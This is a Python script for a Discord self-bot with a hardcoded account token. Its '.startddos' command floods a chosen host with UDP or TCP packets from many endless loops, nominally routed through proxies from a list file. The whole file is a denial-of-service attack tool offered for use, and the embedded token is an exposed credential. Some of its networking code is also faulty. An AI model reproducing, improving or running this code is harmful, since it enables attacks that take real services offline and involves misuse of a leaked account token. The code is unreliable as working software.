import socket
import threading
import random
import asyncio
from discord.ext import commands
import discord
import os
import sys
import time

def start():
    token = "MTE5NjU1NTE4MDg5Njk1NjUyNg.GtQXbW.THBl1wo_HXQEAaQ4xi9FU2FpzULYSb4TkJKmb0"
    prefix = "."
    intents = discord.Intents.all()
    intents.members = True
    client = commands.Bot(command_prefix=prefix, case_insensitive=True, intents=intents, self_bot=True)
    client.remove_command('help')

    def restart_script():
     python_executable = sys.executable  
     os.execv(python_executable, [python_executable] + sys.argv)
    @client.command()
    async def restart(ctx):
        await ctx.send("Restarting DDOS Script")
        time.sleep(1)
        restart_script()
    @client.command()
    async def startddos(ctx, sd: int, target: str, ddos_type: str):
        bytes = random._urandom(1024)
        proxies_file = "proxies.txt"
        
        async def resolve_target(target):
            try:
                if ":" not in target:
                    target = f"{target}:80"

                ip, port = target.split(":")
                ip = socket.gethostbyname(ip)
                await ctx.send(f"Target resolved to IP address: {ip}")
                port = int(port)
                return ip, port
            except (socket.gaierror, ValueError):
                await ctx.send("Invalid IP address or port. Aborting.")
                return None, None

        async def load_proxies(file_path):
            try:
                with open(file_path) as file:
                    proxies = file.readlines()
                return proxies
            except FileNotFoundError:
                await ctx.send(f"Proxies file '{file_path}' not found. Aborting.")
                return None

        async def start_udp_attack(sd, ip, port, bytes, proxies):
            sent = 0

            async def attack():
                nonlocal sent
                while True:
                    proxy = random.choice(proxies) if proxies else None
                    if proxy:
                        proxy_parts = proxy.strip().split(":")
                        proxy_address = proxy_parts[0]
                        proxy_port = int(proxy_parts[1])
                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                            try:
                                s.connect((proxy_address,proxy_port))
                                s.sendto(bytes, (ip, port))
                                sent += 1
                            except Exception as e:
                                print(f"Error sending packet: {e}")

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            tasks = [attack() for _ in range(sd)]
            loop.run_until_complete(asyncio.gather(*tasks))

        async def start_tcp_attack(sd, ip, port, bytes, proxies):
            sent = 0

            async def attack():
                nonlocal sent
                while True:
                    proxy = random.choice(proxies) if proxies else None
                    if proxy:
                        proxy_parts = proxy.strip().split(":")
                        proxy_address = proxy_parts[0]
                        proxy_port = int(proxy_parts[1])
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            try:
                                s.connect((ip, port))
                                s.sendall(bytes)
                                sent += 1
                                message = f"Threads: {sent} | Target: {ip}:{port} | Proxy: {proxy_address}:{proxy_port}\n"
                                await ctx.send(message)
                            except Exception as e:
                                print(f"Error connecting to target: {e}")

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            tasks = [attack() for _ in range(sd)]
            loop.run_until_complete(asyncio.gather(*tasks))

        async def selectddos():
            ip, port = await resolve_target(target)
            if ip and port:
                proxies = await load_proxies(proxies_file)
                if ddos_type.lower() == "udp":
                    await start_udp_attack(sd, ip, port, bytes, proxies)
                elif ddos_type.lower() == "tcp":
                    await start_tcp_attack(sd, ip, port, bytes, proxies)
                else:
                    await ctx.send("Invalid format")

        await selectddos()

    client.run(token=token)

start()
